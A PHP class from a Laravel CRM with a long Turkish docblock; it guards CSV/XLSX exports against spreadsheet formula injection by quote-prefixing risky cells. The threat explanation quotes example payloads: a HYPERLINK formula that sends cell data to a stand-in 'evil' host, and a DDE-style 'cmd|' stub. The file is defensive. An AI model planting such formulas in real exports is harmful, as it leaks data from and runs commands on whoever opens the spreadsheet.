<?php

namespace App\Support;

/**
 * Faz 13 / H2 (ön bulgu F1) — CSV/XLSX dışa aktarmalarında "formül
 * enjeksiyonu" (CSV Injection / Formula Injection) için TEK merkezî nötrleme
 * kapısı.
 *
 * ---------------------------------------------------------------------------
 * TEHDİT
 * ---------------------------------------------------------------------------
 * Bu CRM'de export'a düşen hücrelerin çoğu kullanıcı girdisidir (kullanıcı
 * adı, lead/deal/company başlığı, log açıklaması...). Kimliği doğrulanmış
 * herhangi bir kullanıcı kendi adını/notunu `=HYPERLINK("http://evil/"&A1)`
 * gibi yaparsa ve bu değer bir admin'in Excel'de açtığı export'a düşerse,
 * Excel hücreyi FORMÜL olarak çalıştırır (veri sızıntısı / DDE / harici
 * çağrı). Saldırı payload'ı bizim kodumuzda değil, VERİDE yaşar — bu yüzden
 * koruma "girişte" değil, export'un YAZDIĞI her hücrede uygulanmalı.
 *
 * ---------------------------------------------------------------------------
 * TASARIM KARARI 1 — Hangi karakterler tetikler, TİPE göre mi davranılır?
 * ---------------------------------------------------------------------------
 * Tetikleyici önek kümesi: `=`, `+`, `-`, `@`, TAB (`\t`), CR (`\r`) — OWASP
 * CSV Injection önerisiyle aynı küme. `-` de dahil çünkü Excel
 * `-2+3+cmd|...` gibi bir hücreyi de formül olarak yorumlayabilir; yalnız
 * `=` ile sınırlamak yeterli değildir.
 *
 * Ama `-` (ve `+`) dahil edilince somut bir tuzak doğar: rapor export'unda
 * `MoneyFormatter::normalize()` gibi yardımcılar GERÇEK negatif tutarları
 * `"-1500.00"` biçiminde bir STRING olarak üretir (bcmath hep string döner).
 * Bunu körü körüne nötrlemek raporu bozar (görünürde "'-1500.00" gibi çirkin
 * ve YANLIŞ bir hücre üretir). Bu yüzden davranış hem TİPE hem İÇERİĞE göre:
 *
 *   - int/float/bool/null: HİÇ dokunulmaz. PHP'nin gerçek sayısal tipleri
 *     zaten formül olarak yorumlanamaz (fputcsv/PhpSpreadsheet ikisi de
 *     bunları düz sayı yazar); string'e çevirip yeniden ayrıştırmak
 *     gereksiz ve riskli olur.
 *   - string: yalnızca tehlikeli bir önekle BAŞLIYORSA VE saf bir sayısal
 *     ifade DEĞİLSE nötrlenir. "Saf sayısal" testi `/^[+-]?\d+(\.\d+)?$/` —
 *     yani `-1500.00` geçer (nötrlenmez), ama `+1+1` / `-2+3+cmd|...` /
 *     `=1+1` geçmez (nötrlenir). TAB/CR öneki için sayısal istisna YOK —
 *     meşru bir sayısal değer asla TAB/CR ile başlamaz.
 *
 * ---------------------------------------------------------------------------
 * TASARIM KARARI 2 — Nötrleme yöntemi
 * ---------------------------------------------------------------------------
 * Hücrenin başına tek tırnak (`'`) eklenir (değeri tırnak İÇİNE almak değil,
 * BAŞINA eklemek). Sebep: Excel'in CSV içe aktarımında baştaki `'` "bunu
 * metin olarak davran" işaretidir — CSV/metin kaynaklı bir hücrede İÇERİK
 * `=...` yerine `'=...` olduğu için formül motoru hiç devreye girmez.
 * Değeri çift tırnak içine almak (`"=...`) YETMEZ: CSV zaten alanları
 * tırnaklayabilir ama Excel'in formül algısı hücre İÇERİĞİNİN ilk
 * karakterine bakar, saran tırnaklara değil — `"=1+1"` Excel'de yine
 * formül olarak açılabilir. Bu yüzden tek doğru mekanik "başa tek tırnak".
 *
 * Not (paket farkı): LibreOffice Calc ve Google Sheets'in CSV içe
 * aktarımı da aynı `'` önek kuralını izler (metin-zorlama işareti); bu
 * üçü arasında ekstra bir dallanma gerekmiyor.
 *
 * ---------------------------------------------------------------------------
 * TASARIM KARARI 5 — XLSX yolu (maatwebsite/excel → PhpSpreadsheet)
 * ---------------------------------------------------------------------------
 * KONTROL EDİLDİ: `vendor/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Cell/
 * DefaultValueBinder.php::dataTypeForValue()` — paket formül enjeksiyonuna
 * karşı KORUMA SAĞLAMIYOR, tam tersi: `strlen($value) > 1 && $value[0] ===
 * '='` olan her string'i BİLİNÇLİ olarak `DataType::TYPE_FORMULA` işaretler
 * ve hücreye GERÇEK bir Excel formülü olarak yazar (CSV'deki gibi "Excel
 * açarken tahmin eder" değil, dosyanın kendisinde `<f>` formül düğümü
 * oluşur). `+`/`-`/`@` önekli string'ler bu regex'e girmediği için düz
 * `TYPE_STRING` kalır (XLSX hücre tipi dosyada açıkça yazılı olduğundan
 * Excel bunları formül sanıp yeniden yorumlamaz) — yani gerçek risk XLSX'te
 * yalnız `=` önekiyle sınırlı, ama CSV ile AYNI merkezî kapıdan geçirmek
 * (aşağıdaki `sanitizeCell`) hem tutarlılık hem basitlik sağlıyor; ikinci
 * bir XLSX'e özgü katman (ör. `WithCustomValueBinder`) GEREKSİZ.
 *
 * Bilinen kozmetik yan etki: XLSX'te `'` öneki CSV'nin aksine Excel'in
 * "içe aktarım" adımından GEÇMEZ (PhpSpreadsheet hücreyi doğrudan API ile
 * yazar), bu yüzden tırnak CSV'deki gibi gizlenmez — hücrede görünür kalır
 * (`'=HYPERLINK(...)`). Bu, formülün ÇALIŞMAMASI için ödenen kabul edilebilir
 * bir bedel; zaten kaynağı zararlı bir değerdi, düz metin olarak görünmesi
 * güvenlik açısından zarasız.
 */
final class CsvFormulaGuard
{
    /**
     * Excel/LibreOffice/Sheets'in formül olarak yorumlayabileceği önekler.
     *
     * @var array<int, string>
     */
    private const DANGEROUS_PREFIXES = ['=', '+', '-', '@', "\t", "\r"];

    /**
     * Saf sayısal ifade deseni — `-`/`+` önekli GERÇEK tutarları (ör.
     * `MoneyFormatter::normalize()` çıktısı `"-1500.00"`) nötrlemeden
     * geçirmek için kullanılır (bkz. sınıf docblock'u, Karar 1).
     */
    private const NUMERIC_PATTERN = '/^[+-]?\d+(\.\d+)?$/';

    /**
     * Tek bir hücre değerini gerekirse nötrler; aksi halde değeri
     * DEĞİŞTİRMEDEN döner (int/float/bool/null ve zararsız string'ler).
     */
    public static function sanitizeCell(mixed $value): mixed
    {
        if (! is_string($value) || $value === '') {
            return $value;
        }

        $firstChar = $value[0];

        if (! in_array($firstChar, self::DANGEROUS_PREFIXES, true)) {
            return $value;
        }

        // Yalnız +/- önekli, baştan sona SAF sayısal string'ler için
        // istisna: gerçek bir tutardır, formül değildir (Karar 1).
        if (($firstChar === '+' || $firstChar === '-') && preg_match(self::NUMERIC_PATTERN, $value) === 1) {
            return $value;
        }

        return "'".$value;
    }

    /**
     * Bir satırın (CSV `fputcsv` diziliminde ya da maatwebsite/excel
     * `map()`/`array()` çıktısında) tüm hücrelerini nötrler. Başlık satırı
     * (`$headings`) BİLEREK bu fonksiyondan geçirilmez — başlıklar sabit ve
     * geliştirici-kontrollüdür, kullanıcı girdisi içermez; onları da
     * nötrlemek yalnızca çıktıyı (ör. "id" gibi zararsız bir başlığı bile
     * gereksiz yere) çirkinleştirir, hiçbir gerçek riski kapatmaz (Karar 4).
     *
     * @param  array<int|string, mixed>  $row
     * @return array<int|string, mixed>
     */
    public static function sanitizeRow(array $row): array
    {
        return array_map(self::sanitizeCell(...), $row);
    }
}
